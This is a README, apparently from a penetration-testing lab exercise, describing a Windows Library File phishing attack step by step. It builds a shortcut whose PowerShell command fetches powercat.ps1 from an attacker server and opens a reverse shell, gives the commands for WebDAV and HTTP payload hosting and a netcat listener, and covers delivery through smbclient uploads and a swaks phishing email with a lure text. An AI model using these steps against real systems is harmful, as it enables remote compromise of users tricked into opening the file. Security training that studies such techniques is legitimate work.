This repo contains instructions on how to perform a Windows Library File phishing attack.

## Creating Windows Library File

This file, once opened, will point the target machine to our WebDAV server (more on this later). In order to create this file we will execute either of the `winlib_gen` scripts included in this repo.

## Creating a Malicious Shortcut File

Then we will need to create a shortcut file (*this needs to be done on a Windows Machine*):

- On a Windows machine: *right click on the desktop and select new -> shortcut*.

- *Insert the powershell commands* that `winlib_gen` prints *in the location field*.

This command will *request and invoke `powercat.ps1` from an address where we will be hosting it and then connect to our listener with a reverse shell*.

- Name the shortcut file whatever name is appropriate for your context (example security_update).

## Serving the Files

- We will *transfer the shortcut file to a folder in Kali and host it using WebDAV*:

```bash
wsgidav --host 192.168.45.187 --port 80 --auth anonymous --root .
```

- We will start a *Python3 HTTP server and host powercat.ps1*:

```bash
python3 -m http.server
```

- We will *start a netcat listener to catch the shell*:

```bash
nc -nlvp 4444
```

## Sending the Library File

### SMB - smbclient

We can now transfer `config.Library-ms` via smbclient to the target share and hopefully some user will open the file:

```bash
smbclient //192.168.50.195/sharename -c 'put config.Library-ms' -U 'user%pass'
```

If a user opens the file, we will get a reverse shell.

### Email - swaks

We can send a malicious email using the command-line SMTP tool `swaks`.

- This repo contains a *body.txt file containing an example pretext to encourage the victim* to open the attached library file.

- Then we build our swaks command:

```bash
sudo swaks -t user@domain.com -t user@domain.com --from user@domain.com --attach @config.Library-ms --server {Mailserver IP} --body @body.txt --header "Subject: Announcement" --suppress-data -ap
Username: user
Password: password
```

After a few moments, our WebDAV and Python3 servers will receive requests and our listener will grab a shell.
